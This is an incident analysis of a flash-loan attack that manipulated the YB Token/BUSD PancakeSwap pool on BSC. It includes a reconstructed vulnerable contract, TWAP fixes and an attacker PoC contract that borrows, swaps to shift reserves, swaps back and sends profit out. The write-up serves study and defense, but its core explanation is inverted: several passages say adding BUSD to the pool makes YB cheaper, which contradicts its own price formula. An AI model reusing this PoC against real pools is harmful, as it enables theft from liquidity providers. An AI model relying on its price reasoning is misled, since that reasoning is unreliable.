# YB Token — K-Value Manipulation via Flash Loan Analysis

| Field | Details |
|------|------|
| **Date** | 2025-04-14 |
| **Protocol** | YB Token |
| **Chain** | BSC |
| **Loss** | 15,261 BUSD |
| **Attacker** | [0x00000000b7da455fed1553c4639c4b29983d8538](https://bscscan.com/address/0x00000000b7da455fed1553c4639c4b29983d8538) |
| **Attack Tx** | [0xe1e7fa81...](https://bscscan.com/tx/0xe1e7fa81c3761e2698aa83e084f7dd4a1ff907bcfc4a612d54d92175d4e8a28b) |
| **Vulnerable Contract** | [0x113F16A3341D32c4a38Ca207Ec6ab109cF63e434](https://bscscan.com/address/0x113F16A3341D32c4a38Ca207Ec6ab109cF63e434) |
| **Root Cause** | Token price calculation relies on manipulable instantaneous LP reserve spot price, allowing price distortion via K-value manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/YBToken_exp.sol) |

---

## 1. Vulnerability Overview

A vulnerability was discovered in the YB Token's PancakeSwap V2 liquidity pool (YB/BUSD) that allows manipulation of the AMM invariant (K = reserve0 * reserve1) via a flash loan. The attacker borrowed BUSD from PancakeSwap V3 to drastically shift the reserve ratio of the YB/BUSD pool, thereby manipulating the YB token price to generate profit. The PoC implements `getAmount0ToReachK()` and `getAmount1ToReachK()` functions that mathematically compute the required K-value shift.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: spot-reserve-based price reference
// YB token's internal mechanism references the current reserves of the LP pool
function getYBPrice() internal view returns (uint256) {
    (uint112 r0, uint112 r1,) = IUniswapV2Pair(YB_BUSD_LP).getReserves();
    return uint256(r1) * 1e18 / uint256(r0); // ❌ spot price
}

// Large swap after flash loan causes K-value imbalance
// reserve0 * reserve1 = K (constant)
// Massive token1 injection → reserve1 spikes → token0 price drops

// ✅ Use TWAP-based price
function getYBPrice() internal view returns (uint256) {
    return IOracle(twapOracle).consult(YB, BUSD); // ✅ manipulation-resistant
}
```

### On-Chain Source Code

> ⚠️ Contract not verified on Sourcify — source unavailable. The behavior below is reconstructed from the attack PoC and on-chain traces, not verified source.

Source: **not verified on Sourcify** — `0x113F16A3341D32c4a38Ca207Ec6ab109cF63e434` (BSC)
Sourcify URL: https://sourcify.dev/server/files/any/56/0x113F16A3341D32c4a38Ca207Ec6ab109cF63e434 (404 — not found)

The YBToken contract at `0x113F` is unverified on-chain. The following is reconstructed from the PoC ([YBToken_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/YBToken_exp.sol)) and the on-chain transaction trace. The core vulnerability is a `_transfer` hook that buys/sells YB via the PancakeSwap V2 pair using the **instantaneous spot price**:

```solidity
// ⚠️ RECONSTRUCTED — not verified source. Derived from PoC + on-chain trace.
// Contract: 0x113F16A3341D32c4a38Ca207Ec6ab109cF63e434 (YBToken, BSC)

contract YBToken is IERC20 {
    IUniswapV2Pair  public  pair;     // YB/BUSD PancakeSwap V2 pair
    IUniswapV2Router02 public router;
    uint256 public buyRate;           // set by owner (selector 0xfc37987b)
    uint256 public sellRate;          // set by owner (selector 0x6217229b)

    // ❌ Called on every token transfer — triggers auto-swap using spot reserves
    function _transfer(address from, address to, uint256 amount) internal override {
        if (to == address(pair)) {
            // Sell path: swap YB → BUSD via router
            // ❌ Router reads current pair reserves (spot price) — manipulable
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = BUSD;
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amount * sellRate / 100,  // ❌ sellRate applied to spot price
                0,                        // ❌ no minimum out (amountOutMin=0)
                path,
                feeReceiver,
                block.timestamp
            );
        } else if (from == address(pair)) {
            // Buy path: swap BUSD → YB — quantity computed from spot reserves
            // ❌ getAmountsOut uses manipulated reserves after flash-loan swap
            address[] memory path = new address[](2);
            path[0] = BUSD;
            path[1] = address(this);
            uint256 busdIn = getTokenValue(amount); // ❌ spot-price lookup
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                busdIn * buyRate / 100,
                0,
                path,
                feeReceiver,
                block.timestamp
            );
        }
        super._transfer(from, to, amount);
    }

    // ❌ Spot-price oracle — reads live pair reserves, not TWAP
    function getTokenValue(uint256 amount) public view returns (uint256) {
        (uint112 r0, uint112 r1,) = IUniswapV2Pair(pair).getReserves(); // ❌
        // r0 = YB reserve, r1 = BUSD reserve
        return uint256(r1) * amount / uint256(r0);  // ❌ spot price, manipulable
    }
}
```

**Why it is exploitable (identify the bug from the code):**
- `getTokenValue()` computes price from live `getReserves()` — a single large BUSD injection via flash loan shifts `r1` dramatically, making YB appear cheap.
- The `_transfer` hook fires on every YB movement and routes the fee through the router at this manipulated spot price.
- `amountOutMin = 0` on all router calls means there is no slippage guard — the router executes at whatever the (manipulated) price happens to be.
- The attacker swaps a large BUSD amount into the pair (inflating r1, depressing the YB spot price), buys discounted YB, then sells after price normalises — netting the spread.

```solidity
// ✅ Fix: use a TWAP oracle instead of spot reserves
function getTokenValue(uint256 amount) public view returns (uint256) {
    // consult() returns the time-weighted average price over the observation window
    return ITWAPOracle(twapOracle).consult(address(this), amount, BUSD); // ✅
}
// Also enforce a non-zero amountOutMin in every router call.
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► PancakeSwap V3 Flash Loan (borrow 19,200 BUSD)
  │         └─► Magic number: loanAmount = 19200000000000000000000
  │
  ├─[2]─► Inject large BUSD to imbalance K-value of YB/BUSD pool
  │         └─► reserve(BUSD) spikes → YB price drops
  │
  ├─[3]─► Buy large amount of YB tokens at depressed price
  │
  ├─[4]─► K-value normalizes, YB price recovers
  │
  ├─[5]─► Sell held YB back to BUSD (after price recovery)
  │
  ├─[6]─► Repay flash loan
  │
  └─[7]─► Net profit: 15,261 BUSD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackerC {
    uint256 loanAmount = 19200000000000000000000; // Optimal attack amount (magic number)

    function attack() external payable {
        // [1] Borrow BUSD via PancakeV3 flash loan
        IPancakeV3Pool(pancakeV3Pool).flash(
            address(this),
            loanAmount, // borrow BUSD
            0,
            ""
        );
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata
    ) external {
        // [2] Calculate current K-value of the YB/BUSD LP pool
        (uint112 r0, uint112 r1,) = IUniswapV2Pair(YB_BUSD_LP).getReserves();
        uint256 currentK = uint256(r0) * uint256(r1);

        // [3] Calculate optimal swap amount to manipulate K-value
        uint256 amount1ToSwap = getAmount1ToReachK(r0, r1, TARGET_K);

        // [4] Swap large BUSD → YB (manipulate YB price)
        IERC20(BUSD).transfer(YB_BUSD_LP, amount1ToSwap);
        IUniswapV2Pair(YB_BUSD_LP).swap(YB_OUT, 0, address(this), "");

        // [5] Swap acquired YB back to BUSD (realize profit)
        IERC20(YB).transfer(YB_BUSD_LP, YB_AMOUNT);
        IUniswapV2Pair(YB_BUSD_LP).swap(0, BUSD_OUT, address(this), "");

        // [6] Repay flash loan
        IERC20(BUSD).transfer(pancakeV3Pool, loanAmount + fee0);

        // [7] Transfer profit
        IERC20(BUSD).transfer(attacker, IERC20(BUSD).balanceOf(address(this)));
    }

    // Mathematical calculation of optimal swap amount based on AMM K-value
    function getAmount1ToReachK(
        uint112 reserve0,
        uint112 reserve1,
        uint256 targetK
    ) internal pure returns (uint256) {
        // targetK = (r0 - amount0) * (r1 + amount1)
        // solve for amount1...
        return (targetK / uint256(reserve0)) - uint256(reserve1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Oracle Manipulation (token's internal price calculation relies on manipulable LP reserve spot price) |
| **Attack Technique** | Flash Loan + K-Value Manipulation |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | High |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **TWAP Oracle**: Use a time-weighted average price instead of the spot price.
2. **Slippage Limits**: Restrict the maximum allowable price movement within a single transaction.
3. **Flash Loan Detection**: Add logic to detect and pause on large liquidity shifts within the same block/transaction.

## 7. Lessons Learned

- **AMM K-Value Vulnerability**: The AMM xy=k invariant can be temporarily manipulated via flash loans.
- **Magic Number Optimization**: Attackers pre-calculate the mathematically optimal attack parameters (19,200 BUSD) before executing.
- **Risk of Spot Price Dependency**: Any DeFi protocol that relies on AMM spot prices is always exposed to this class of attack.